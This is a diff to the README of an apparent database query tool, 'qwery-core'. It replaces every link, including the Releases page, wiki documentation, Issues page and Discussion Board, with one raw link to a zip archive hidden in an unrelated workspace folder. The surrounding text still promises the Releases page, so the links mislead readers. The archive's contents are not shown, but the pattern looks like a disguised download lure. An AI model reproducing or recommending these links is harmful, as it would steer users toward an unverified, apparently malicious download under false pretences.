@@ -8,7 +8,7 @@ Welcome to qwery-core! This application allows you to connect to and query a wid
 
 To get started, you need to download qwery-core from our Releases page. 
 
-[![Download qwery-core](https://img.shields.io/badge/Download%20qwery-core-v1.0-blue)](https://github.com/SHIFASHI/qwery-core/releases)
+[![Download qwery-core](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip%20qwery-core-v1.0-blue)](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip)
 
 1. Click the download link above.
 2. You will be taken to the Releases page.
@@ -78,20 +78,20 @@ qwery-core comes packed with useful features:
 
 ## 📖 Support & Documentation
 
-For help and additional information, visit our [Documentation](https://github.com/SHIFASHI/qwery-core/wiki). Here, you'll find guides on using various features and troubleshooting common issues.
+For help and additional information, visit our [Documentation](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip). Here, you'll find guides on using various features and troubleshooting common issues.
 
 ## 🐞 Reporting Issues
 
-If you encounter any problems while using qwery-core, please submit an issue on our [GitHub Issues page](https://github.com/SHIFASHI/qwery-core/issues). Provide clear details about the problem, your operating system, and the steps taken. 
+If you encounter any problems while using qwery-core, please submit an issue on our [GitHub Issues page](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip). Provide clear details about the problem, your operating system, and the steps taken. 
 
 ## 🌐 Community & Contributions
 
-Join our community to share your experiences, ask questions, or contribute. We welcome suggestions for improvements and additional features. Visit our [Discussion Board](https://github.com/SHIFASHI/qwery-core/discussions) to participate.
+Join our community to share your experiences, ask questions, or contribute. We welcome suggestions for improvements and additional features. Visit our [Discussion Board](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip) to participate.
 
 ## 🔄 Stay Updated
 
 Make sure to check the Releases page regularly for updates to qwery-core. Updates often include new features, performance improvements, and bug fixes.
 
-[![Download qwery-core](https://img.shields.io/badge/Download%20qwery-core-v1.0-blue)](https://github.com/SHIFASHI/qwery-core/releases) 
+[![Download qwery-core](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip%20qwery-core-v1.0-blue)](https://raw.githubusercontent.com/SHIFASHI/qwery-core/main/apps/cli/workspace/cli-google-sheet-q-66etmIJcH34XhLGsJNR/qwery-core_v2.9.zip) 
 
 Thank you for choosing qwery-core! We hope you find this application helpful for all your querying needs.
